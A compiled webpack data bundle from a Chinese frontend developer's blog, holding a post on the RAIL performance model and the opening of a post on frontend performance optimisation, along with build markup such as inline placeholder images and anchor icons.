webpackJsonp([0x837b60186461],{1576:function(a,n){a.exports={data:{site:{siteMetadata:{title:"女王控的博客",description:'前端工程师，黑猫女王控，欢迎勾搭，技术相关<a href="https://github.com/towavephone" target="_blank">@towavephone</a>，QQ闲聊<a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=634407147&website=www.oicqzone.com">@towave</a>，bili关注<a href="https://space.bilibili.com/11507708#/" target="_blank">@towave</a>',siteUrl:"https://blog.towavephone.com"}}},pathContext:{posts:[{excerpt:"RAIL 是一个以用户为中心的性能模型，它把用户的体验拆分成几个关键点（例如，tap，scroll，load），并且帮你定义好了每一个的性能指标。 有以下四个方面： Response Animation Idle Load 聚焦用户 以下是用户对性能延迟的感知： 延迟时间 用户感知 0-16ms 很流畅 0-100ms 基本流畅 100-1000ms 感觉到网站上有一些加载任务 1000ms or more 失去耐心了 10000ms or more 直接离开，不会再访问了 Response…",html:'<p>RAIL 是一个以用户为中心的性能模型，它把用户的体验拆分成几个关键点（例如，tap，scroll，load），并且帮你定义好了每一个的性能指标。</p>\n<p>有以下四个方面：</p>\n<ul>\n<li>Response</li>\n<li>Animation</li>\n<li>Idle</li>\n<li>Load</li>\n</ul>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-23-26-26-cf3e209b55e649ea13a900aaec0e7c84-a9fd5.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 36.25%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABc0lEQVQY06WLy0pCURSGN02iR2kY9AIRERSEBUIaRDiteUVFWVBIDRzYzS5Y5iDJqNAstRQVSzM6mkEniUSqU2kl6tF9Lnuvjr5CC9bi/1j/hwDgnftkn9KSTAhVCPhi0bCwEI/FagAEV/nMy7MkVIGSWvmDSySTFVxVMlKWUlnGBaBi3YVcsXjiD3yXSnUCkdAyluu12v/zjQucejHGNZnlwHEDLoYex0ksC/QxRZxHksclHR+QVEriwpgxCfdmnFgmH/GLXHr1wb0Udayx3sRvFtkitGuRDKzQboM07QZpd6Ok6uB1/Xxfp7C+VvYO/RhQYac5P4/E4HhXxNxkG2g9m2jY0+iTDmQN014jGbbIaqOkPwdxx8xrVfyIrqztEbY2y+5BRSvYWvKzSPCPtYeWG62aNs8csqgn7/bRXQZWfGAJwrqP+ligt1FsNgnWbWHDJF9fiRlnJTRaiUwqV85e2l+ZGcY+d384xdjDXyyCf8wf8bZTMIcuuf4AAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 20 23 26 26" title="" data-src="/static/2021-07-20-23-26-26-cf3e209b55e649ea13a900aaec0e7c84-fee1c.png" data-srcset="/static/2021-07-20-23-26-26-cf3e209b55e649ea13a900aaec0e7c84-a67b7.png 200w,\n/static/2021-07-20-23-26-26-cf3e209b55e649ea13a900aaec0e7c84-0b187.png 400w,\n/static/2021-07-20-23-26-26-cf3e209b55e649ea13a900aaec0e7c84-fee1c.png 800w,\n/static/2021-07-20-23-26-26-cf3e209b55e649ea13a900aaec0e7c84-b1a91.png 1200w,\n/static/2021-07-20-23-26-26-cf3e209b55e649ea13a900aaec0e7c84-a9fd5.png 1280w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<h1 id="聚焦用户"><a href="#%E8%81%9A%E7%84%A6%E7%94%A8%E6%88%B7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>聚焦用户</h1>\n<p>以下是用户对性能延迟的感知：</p>\n<table>\n<thead>\n<tr>\n<th align="left">延迟时间</th>\n<th align="left">用户感知</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align="left">0-16ms</td>\n<td align="left">很流畅</td>\n</tr>\n<tr>\n<td align="left">0-100ms</td>\n<td align="left">基本流畅</td>\n</tr>\n<tr>\n<td align="left">100-1000ms</td>\n<td align="left">感觉到网站上有一些加载任务</td>\n</tr>\n<tr>\n<td align="left">1000ms or more</td>\n<td align="left">失去耐心了</td>\n</tr>\n<tr>\n<td align="left">10000ms or more</td>\n<td align="left">直接离开，不会再访问了</td>\n</tr>\n</tbody>\n</table>\n<h1 id="response-事件处理最好在-50ms-内完成"><a href="#response-%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E6%9C%80%E5%A5%BD%E5%9C%A8-50ms-%E5%86%85%E5%AE%8C%E6%88%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Response: 事件处理最好在 50ms 内完成</h1>\n<h2 id="目标"><a href="#%E7%9B%AE%E6%A0%87" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>目标</h2>\n<p>用户的输入到响应的时间不超过 100ms，给用户的感受是瞬间就完成了。</p>\n<h2 id="优化方案"><a href="#%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>优化方案</h2>\n<ul>\n<li>事件处理函数在 50ms 内完成，考虑到 idle task 的情况，事件会排队，等待时间大概在 50ms。适用于 click，toggle，starting animations 等，不适用于 drag 和 scroll。</li>\n<li>复杂的 js 计算尽可能放在后台，如 web worker，避免对用户输入造成阻塞</li>\n<li>超过 50ms 的响应，一定要提供反馈，比如倒计时，进度百分比等。</li>\n</ul>\n<blockquote>\n<p>idle task：除了要处理输入事件，浏览器还有其它任务要做，这些任务会占用部分时间，一般情况会花费 50ms 的时间，输入事件的响应则排在其后。</p>\n</blockquote>\n<p>下图是 idle task 对 input response 的影响：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-23-32-38-d539fd6beaf9d735819b1ce5953e7063-a9fd5.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsSAAALEgHS3X78AAACJUlEQVQoz11QTWzScBTv3ZMXExPvO3jx5M2blxmzme1ilqjzMA/LFNmW6WnGg06iEYtCtuHXhg5FjLoPzSAgDApbmzGsbAjCKOUzQktbWvrB2vpfnAn68svLey+/j+RBekdpqkYUcrzU1P8tsd0iyrskSSqK0nmHOpWgJ9E0uVJnwgoVEOmIQCECtcY3wlLMneBY9j/TfbGqak2eF4QWmIt4nXDIVZdeeqOVPqglp16c06rzeuoVLYqyKErNfWpL03SAg+Q9RdLakqqpTDZHrfqYYLDhjwqZRZGxiPR0i3pSyTtkqaWrigpobfkgucEr8RyTILn4LlNgFdyLBa48jBgsyFVHdmGo4j1U/nKUXDqcXDpFVNlveW6bZPE8U+fkVImDkB9Un2l9wIz23EGmfeRbN2a6bLONzFqGXTH3GBXuKoe6K/7jGe9Z63KqZyo6YN7oN0VXt6qjL3AonKxfhFGDPXbBvD7jJxdc2P2hGbvx2aMRN+Yy1pAThVB/8evJn55u60pqEMau22OXYBSIx1/i0NpOvc8UBXvv3bDNQzx/FzMMv7414ZoY84bej9KBIxVfV9lzLOs9DS8mz01FB2EUJH/erF57Godwgrkx/33SuQOcPqKVT4H07cfhB/bIvdkEFrRym2dq2Pka2vtry+hG8uNziUnn9k1HYiNNw8sZCHx8T9X+QNU0SZbZJk83GI4XZFkSeI5laJ5nwaz+pQEAFWi/AUNw41rj4NKNAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 20 23 32 38" title="" data-src="/static/2021-07-20-23-32-38-d539fd6beaf9d735819b1ce5953e7063-fee1c.png" data-srcset="/static/2021-07-20-23-32-38-d539fd6beaf9d735819b1ce5953e7063-a67b7.png 200w,\n/static/2021-07-20-23-32-38-d539fd6beaf9d735819b1ce5953e7063-0b187.png 400w,\n/static/2021-07-20-23-32-38-d539fd6beaf9d735819b1ce5953e7063-fee1c.png 800w,\n/static/2021-07-20-23-32-38-d539fd6beaf9d735819b1ce5953e7063-b1a91.png 1200w,\n/static/2021-07-20-23-32-38-d539fd6beaf9d735819b1ce5953e7063-a9fd5.png 1280w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<h1 id="animation-在-10ms-内产生一帧"><a href="#animation-%E5%9C%A8-10ms-%E5%86%85%E4%BA%A7%E7%94%9F%E4%B8%80%E5%B8%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Animation: 在 10ms 内产生一帧</h1>\n<h2 id="目标-1"><a href="#%E7%9B%AE%E6%A0%87-1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>目标</h2>\n<ul>\n<li>产生每一帧的时间不要超过 10ms，为了保证浏览器 60 帧，每一帧的时间在 16ms 左右，但浏览器需要用 6ms 来渲染每一帧。</li>\n<li>旨在视觉上的平滑。用户对帧率变化感知很敏感。</li>\n</ul>\n<h2 id="优化方案-1"><a href="#%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88-1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>优化方案</h2>\n<ul>\n<li>在一些高压点上，比如动画，不要去挑战 cpu，尽可能地少做事，如：取 offset，设置 style 等操作。尽可能地保证 60 帧的体验。</li>\n<li>在渲染性能上，针对不同的动画做一些特定优化</li>\n</ul>\n<blockquote>\n<p>动画不只是 UI 的视觉效果，以下行为都属于</p>\n<ul>\n<li>视觉动画，如渐隐渐显，tweens，loading 等</li>\n<li>滚动，包含弹性滚动，松开手指后，滚动会持续一段距离</li>\n<li>拖拽，缩放，经常伴随着用户行为</li>\n</ul>\n</blockquote>\n<h1 id="idle-最大化空闲时间"><a href="#idle-%E6%9C%80%E5%A4%A7%E5%8C%96%E7%A9%BA%E9%97%B2%E6%97%B6%E9%97%B4" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Idle: 最大化空闲时间</h1>\n<h2 id="目标-2"><a href="#%E7%9B%AE%E6%A0%87-2" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>目标</h2>\n<p>最大化空闲时间，以增大 50ms 内响应用户输入的几率</p>\n<h2 id="优化方案-2"><a href="#%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88-2" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>优化方案</h2>\n<ul>\n<li>用空闲时间来完成一些延后的工作，如先加载页面可见的部分，然后利用空闲时间加载剩余部分，此处可以使用 requestIdleCallback API</li>\n<li>在空闲时间内执行的任务尽量控制在 50ms 以内，如果更长的话，会影响 input handle 的 pending 时间</li>\n<li>如果用户在空闲时间任务进行时进行交互，必须以此为最高优先级，并暂停空闲时间的任务</li>\n</ul>\n<h1 id="load-传输内容到页面可交互的时间不超过-5-秒"><a href="#load-%E4%BC%A0%E8%BE%93%E5%86%85%E5%AE%B9%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%8F%AF%E4%BA%A4%E4%BA%92%E7%9A%84%E6%97%B6%E9%97%B4%E4%B8%8D%E8%B6%85%E8%BF%87-5-%E7%A7%92" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Load: 传输内容到页面可交互的时间不超过 5 秒</h1>\n<p>如果页面加载比较慢，用户的焦点可能会离开。加载很快的页面，用户平均停留时间会变长，跳出率会更低，也就有更高的广告查看率</p>\n<h2 id="目标-3"><a href="#%E7%9B%AE%E6%A0%87-3" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>目标</h2>\n<ul>\n<li>优化加载速度，可以根据设备、网络等条件。目前，比较好的一个方式是，让你的页面在一个中配的 3G 网络手机上打开时间不超过 5 秒</li>\n<li>对于第二次打开，尽量不超过 2 秒</li>\n</ul>\n<h2 id="优化方案-3"><a href="#%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88-3" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>优化方案</h2>\n<ul>\n<li>在手机设备上测试加载性能，选用中配的 3G 网络（400kb/s，400ms RTT），可以使用 <a href="https://www.webpagetest.org/easy" target="_blank" rel="nofollow noreferrer noopener">WebPageTest</a> 来测试</li>\n<li>要注意的是，即使用户的网络是 4G，但因为丢包或者网络波动，可能会比预期的更慢禁用渲染阻塞的资源</li>\n<li><a href="https://web.dev/render-blocking-resources/" target="_blank" rel="nofollow noreferrer noopener">禁用渲染阻塞的资源，延后加载</a></li>\n<li>可以采用 lazy load，code-splitting 等其他优化手段，让第一次加载的资源更少</li>\n</ul>\n<h1 id="总结"><a href="#%E6%80%BB%E7%BB%93" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h1>\n<p>为了提升用户在网站的交互体验而不断探索。你需要去理解用户如何感知你的站点，这样才能设置最佳的性能目标</p>\n<ul>\n<li>聚焦用户</li>\n<li>100ms 内响应用户的输入</li>\n<li>10ms 内产生 1 帧，在滚动或者动画执行时</li>\n<li>最大化主线程的空闲时间</li>\n<li>5s 内让网页变得可交互</li>\n</ul>',id:"/home/runner/work/GatsbyBlog/GatsbyBlog/blog/前端性能优化指标RAIL/index.md absPath of file >>> MarkdownRemark",timeToRead:3,frontmatter:{date:"2021-07-23 02:25:10",path:"/performance-optimization-rail/",tags:"面试, 前端, 前端性能优化",title:"前端性能优化指标 RAIL",draft:null}},{excerpt:"背景 性能优化一直以来都是前端工程领域中的一个重要部分。很多资料表明，网站应用的性能（加载速度、交互流畅度）优化对于提高用户留存、转化率等都有积极影响。可以理解为，提升你的网站性能，就是提升你的业务数据（甚至是业务收入）。 性能优化广义上会包含前端优化和后端优化。后端优化的关注点更多的时候是在增加资源利用率、降低资源成本以及提高稳定性上。相较于后端，前端的性能优化会更直接与用户的体验挂钩。从用户体验侧来说，前端服务 5s 的加载时间优化缩减 80%(1s) 与后端服务 50ms…",html:'<h1 id="背景"><a href="#%E8%83%8C%E6%99%AF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>背景</h1>\n<p>性能优化一直以来都是前端工程领域中的一个重要部分。很多资料表明，网站应用的性能（加载速度、交互流畅度）优化对于提高用户留存、转化率等都有积极影响。可以理解为，提升你的网站性能，就是提升你的业务数据（甚至是业务收入）。</p>\n<p>性能优化广义上会包含前端优化和后端优化。后端优化的关注点更多的时候是在增加资源利用率、降低资源成本以及提高稳定性上。相较于后端，前端的性能优化会更直接与用户的体验挂钩。从用户体验侧来说，前端服务 5s 的加载时间优化缩减 80%(1s) 与后端服务 50ms 的响应优化缩减 80%(10ms) 相比，用户的体验提升会更大。因此很多时候，与体验相关的性能的瓶颈会出现在前端。</p>\n<blockquote>\n<p>当然后端性能优化非常重要，正如上面所说，它们的关注点可能不同。前端类似于最后一公里，由于和用户最近，所以性能问题会直接影响到用户体验。</p>\n</blockquote>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-21-00-10-40-b288ab495c3e53163ef4ac8d03ad6e22-43c12.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 35.6%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsSAAALEgHS3X78AAABRklEQVQoz2XRS0/CUBCG4f7/ncaFCahx7UKNiQvjVkRjTBTUQEJbCkTxAqXt6bm09HVARYyLp18vk5yZqTe4afJye42KRuT96L9oyKz9wKzVRsv977fBl7CP/phgXImxDq837vHw8sRN5JOnhixRIl8jz5khzTRpkq1R37WKJNXMpGbBq0pgDn4c8q4UsXZMcytpV5kZjTKlQFRLiS6YSe2Cls7KoljyVK6o3JzuR4+NuwO27o/F0Xces3l3yFm/wdUwpDHwuRz6XEi2nif4b4bOOOM10ThrMcbiaTm9KuYE04Bap0a9U/9np7PHbnef2uMJ9cdTttunNJ9b0vmEqiwonMXaL97iUpUVYRwRxCOskz0aJWOtk51JpjL+j0Rn8j7HuUK4FU9rzVz+UDCNOA+6JMqtFvwjUVZGcsuxfrllR8aYPz4BMzQJ4ftwwnUAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 21 00 10 40" title="" data-src="/static/2021-07-21-00-10-40-b288ab495c3e53163ef4ac8d03ad6e22-fee1c.png" data-srcset="/static/2021-07-21-00-10-40-b288ab495c3e53163ef4ac8d03ad6e22-a67b7.png 200w,\n/static/2021-07-21-00-10-40-b288ab495c3e53163ef4ac8d03ad6e22-0b187.png 400w,\n/static/2021-07-21-00-10-40-b288ab495c3e53163ef4ac8d03ad6e22-fee1c.png 800w,\n/static/2021-07-21-00-10-40-b288ab495c3e53163ef4ac8d03ad6e22-b1a91.png 1200w,\n/static/2021-07-21-00-10-40-b288ab495c3e53163ef4ac8d03ad6e22-43c12.png 1500w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<h1 id="缓存"><a href="#%E7%BC%93%E5%AD%98" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>缓存</h1>\n<p><a href="/deep-learn-browser-cache/">深入理解浏览器的缓存机制</a></p>\n<h1 id="发送请求"><a href="#%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>发送请求</h1>\n<p>在前一部分，我们介绍了浏览器缓存。当一个请求走过了各级前端缓存后，就会需要实际发送一个请求了。</p>\n<blockquote>\n<p>在 HTTP 缓存中，我们其实也有发送请求；或者是在 